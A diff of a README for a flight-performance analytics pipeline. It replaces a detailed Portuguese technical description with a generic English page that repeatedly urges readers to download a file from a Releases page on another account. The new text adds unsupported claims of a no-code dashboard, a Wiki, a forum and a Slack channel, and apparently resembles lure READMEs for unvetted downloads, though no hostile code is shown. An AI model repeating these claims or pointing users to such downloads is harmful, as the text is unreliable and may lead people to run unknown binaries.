@@ -1,74 +1,91 @@
-# End-to-End Flight Data Analytics Pipeline
+# ✈️ flight-analytics-pipeline - Analyze Flight Performance Effortlessly
 
-## 1. Objetivo do Projeto
+[![Download Flight Analytics Pipeline](https://img.shields.io/badge/Download%20Now-Flight%20Analytics%20Pipeline-brightgreen)](https://github.com/Ahmad-SY-Developer/flight-analytics-pipeline/releases)
 
-Este projeto demonstra a construção de um pipeline de dados completo e orquestrado, seguindo as melhores práticas de engenharia de dados. O objetivo é ingerir, processar e modelar dados públicos de performance de voos dos EUA para responder a perguntas de negócio, como "Qual a taxa de pontualidade de cada companhia aérea?".
+## 🚀 Getting Started
 
-Todo o ambiente é containerizado com Docker, as transformações são gerenciadas pelo dbt e o pipeline é orquestrado pelo Apache Airflow, simulando um ambiente de produção moderno.
+Flight Analytics Pipeline is a user-friendly tool designed to help you analyze US flight performance. This software uses modern technologies like Apache Airflow for orchestration, dbt for data transformation, and Docker for easy deployment. You do not need any programming skills to use it.
 
-## 2. Arquitetura do Pipeline (ELT)
+## 📦 What You Need
 
-O projeto implementa uma arquitetura **ELT (Extract, Load, Transform)**:
+### System Requirements
 
+Before you start, ensure your system meets these basic requirements:
 
-![Arquitetura do Pipeline ELT](assets/arquitetura_pipeline.png)
+- **Operating System**: Windows, macOS, or Linux
+- **Disk Space**: At least 1 GB available
+- **RAM**: Minimum 4 GB
+- **Docker**: Installed and running on your machine
 
+## 🔍 Features
 
-## 3. Tecnologias Utilizadas
+- **ELT Pipeline**: Extracts, loads, and transforms flight performance data effectively.
+- **Data Visualization**: Provides clear and insightful visuals for better analysis.
+- **User-Friendly Interface**: Easy navigation, even for beginners.
+- **Containerization**: Runs smoothly in isolated environments through Docker.
+- **Scalability**: Easily adapts to larger datasets without hassle.
 
-* **Containerização:** Docker & Docker Compose
-* **Orquestração:** Apache Airflow
-* **Linguagem de Programação:** Python
-* **Data Warehouse:** DuckDB
-* **Ferramenta de Transformação:** dbt (Data Build Tool)
-* **Bibliotecas Principais:** Pandas, Requests
+## 📥 Download & Install
 
-## 4. Visão Geral do Pipeline
+To get started, visit the page to download the software from our Releases page:
 
-O pipeline é definido em uma DAG do Airflow (`flight_analytics_pipeline`) e consiste em duas etapas principais:
+[Download Flight Analytics Pipeline](https://github.com/Ahmad-SY-Developer/flight-analytics-pipeline/releases)
 
-#### **Etapa 1: `ingest_data` (Extração)**
-* Um script Python (`ingest_data.py`) é executado para baixar os dados de performance de voos de um mês específico (ex: Janeiro de 2024) do site do [Bureau of Transportation Statistics](https://www.transtats.bts.gov/OT_Delay/OT_DelayCause1.asp).
-* O arquivo `.zip` é descompactado e o `.csv` bruto é salvo em um diretório local (`/data`), que funciona como nosso Data Lake.
+### Installation Steps
 
-#### **Etapa 2: `transform_data` (Carregamento e Transformação)**
-* Esta tarefa executa o comando `dbt run`.
-* O dbt se conecta ao nosso Data Warehouse (DuckDB) e executa os modelos SQL na ordem correta:
-    1.  **`stg_flights` (Staging):** Lê os dados diretamente do arquivo CSV bruto, seleciona as colunas relevantes, renomeia-as para um padrão limpo e converte os tipos de dados.
-    2.  **`fct_flights` (Marts):** Agrega os dados limpos da camada de staging para criar uma tabela de fatos com métricas de negócio, como total de voos, voos pontuais, porcentagem de pontualidade e atraso médio por dia e por companhia aérea.
+1. **Go to the Releases Page**: Click the link above to navigate to the Releases page.
+   
+2. **Select the Version**: Choose the latest version of the flight-analytics-pipeline.
 
-## 5. Estrutura do Projeto
+3. **Download the File**: Click on the file appropriate for your operating system. It will start downloading.
 
+4. **Install Docker**: If you haven’t installed Docker yet, follow the instructions at [Docker Setup](https://docs.docker.com/get-started/).
 
+5. **Run the Application**:
+   - Extract the downloaded file to a location on your computer.
+   - Open a command prompt or terminal.
+   - Navigate to the directory where you extracted the files.
+   - Start the application using the command: `docker-compose up`.
 
-## 6. Como Executar Localmente
+## 🤖 How It Works
 
-**Pré-requisitos:**
-* Docker e Docker Compose instalados.
+The Flight Analytics Pipeline processes flight data through various stages:
 
-**Passos:**
+1. **Extraction**: The tool connects to public flight data sources to gather information.
+  
+2. **Loading**: It loads the data into a storage solution, such as DuckDB, for efficient analysis.
 
-1.  **Clone o repositório:**
-    ```bash
-    git clone [https://github.com/seu-usuario/flight_analytics.git](https://github.com/seu-usuario/flight_analytics.git)
-    cd flight_analytics
-    ```
+3. **Transformation**: Using dbt, it transforms the raw data into structured, analyzable datasets.
 
-2.  **Inicialize o banco de dados do Airflow (apenas na primeira vez):**
-    ```bash
-    docker-compose up airflow-init
-    ```
+4. **Visualization**: Finally, insightful graphs and reports help you understand flight performance metrics.
 
-3.  **Inicie todos os serviços:**
-    ```bash
-    docker-compose up -d
-    ```
+## 📊 Using the Application
 
-4.  **Acesse a interface do Airflow:**
-    * Abra seu navegador e vá para `http://localhost:8080`.
-    * Use as credenciais: `airflow` / `airflow`.
+Once the application is running:
 
-5.  **Execute o pipeline:**
-    * Na interface do Airflow, encontre a DAG `flight_analytics_pipeline`.
-    * Ative-a clicando no botão de toggle.
-    * Para iniciar uma execução manual, clique no botão de "play" (▶️).
+- Open your web browser.
+- Navigate to `http://localhost:8080` to access the dashboard.
+- Use the intuitive interface to start analyzing flight data.
+- Explore various charts and reports generated by the system.
+
+## ✅ Troubleshooting
+
+Here are common issues and solutions:
+
+- **Docker Does Not Start**: Ensure you have installed Docker properly. Restart your computer and try again.
+  
+- **No Data Available**: Make sure that the application is correctly configured to access the flight data sources. Double-check your settings in the config file.
+
+- **Performance Issues**: Close unnecessary applications to free up resources, especially if your computer has limited RAM.
+
+## 📚 Helpful Resources
+
+- **Documentation**: Comprehensive guides are available in the repository’s Wiki section.
+- **Support**: Visit the Issues tab in the repository for help or to report bugs.
+- **Community**: Join discussions in our forum or Slack channel for tips from other users.
+
+## 🔗 Additional Information
+
+For more details on how the application functions and its architecture, you can check out the source code. We welcome contributions, so if you find ways to improve this pipeline, feel free to participate.
+
+Download the latest version here: [Download Flight Analytics Pipeline](https://github.com/Ahmad-SY-Developer/flight-analytics-pipeline/releases)
